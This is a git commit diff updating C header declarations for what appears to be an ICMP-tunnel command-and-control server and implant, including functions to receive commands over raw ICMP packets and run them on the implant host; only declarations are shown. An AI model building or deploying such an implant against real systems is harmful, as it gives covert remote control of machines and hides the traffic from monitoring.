6785bd33f43efa9ccef6dc6f4fbcc5aae755df86
g0rchy <92731777+g0rchy@users.noreply.github.com>
2022-11-05 12:08:10 +0100

    updated functions declarations

--- include/c2.h
+++ include/c2.h
@@ -2,18 +2,19 @@
 #define C2_H
 
 #include <netinet/ip_icmp.h>
-#define BUFFER_SIZE 1024
+#define BUFFER_SIZE 1472
 
 void c2_init_n_call(char *interface_to_bind);
 int create_socket(char *inteface_to_bind);
-int read_from_socket(int sockfd, char *buffer,int size);
+size_t read_from_socket(int sockfd, unsigned char *buffer, size_t size);
+unsigned short cksum(unsigned short *addr, int len);
 void interact(int sockfd);
 void print_connection_succeed(char *src_ip);
-char *get_command(char *buffer);
+unsigned char *get_command(char *input);
 int check_magic_byte(struct icmphdr *icmp);
 struct sockaddr_in prep_ip_headers(struct iphdr *ip);
-char *parse_data_section(char *packet);
-void prep_icmp_headers(struct icmphdr *icmp, char *data, uint16_t checksum);
-void append_to_data_section(struct icmphdr *icmp, char *data, char *input);
+unsigned char *parse_data_section(unsigned char *packet);
+void prep_icmp_headers(struct icmphdr *icmp, uint16_t checksum);
+void append_to_data_section(struct icmphdr *icmp, unsigned char *data, unsigned char *input);
 
 #endif
--- include/implant.h
+++ include/implant.h
@@ -2,17 +2,17 @@
 #define implant_H
 
 #include <netinet/ip_icmp.h>
-#define BUFFER_SIZE 1024
+#define BUFFER_SIZE 1472
 
 void implant_init_n_call(char *dest_ip);
-int read_from_socket(int sockfd, char *buffer,int size);
+int read_from_socket(int sockfd, unsigned char *buffer, int size);
 int create_socket(void);
 int check_magic_byte(struct icmphdr *icmp);
-char *invoke_command(char *data);
+size_t invoke_command(unsigned char *data, unsigned char *output);
 void interact(int sockfd, char *dest_ip);
 struct sockaddr_in prep_ip_headers(struct iphdr *ip);
-char *parse_data_section(char *packet);
-void prep_icmp_headers(struct icmphdr *icmp, char *data, uint16_t checksum);
-void append_to_data_section(struct icmphdr *icmp, char *data, char *input);
+unsigned char *parse_data_section(unsigned char *packet);
+void prep_icmp_headers(struct icmphdr *icmp, unsigned char *data, uint16_t checksum);
+void append_to_data_section(struct icmphdr *icmp, unsigned char *data, unsigned char *input);
 
 #endif
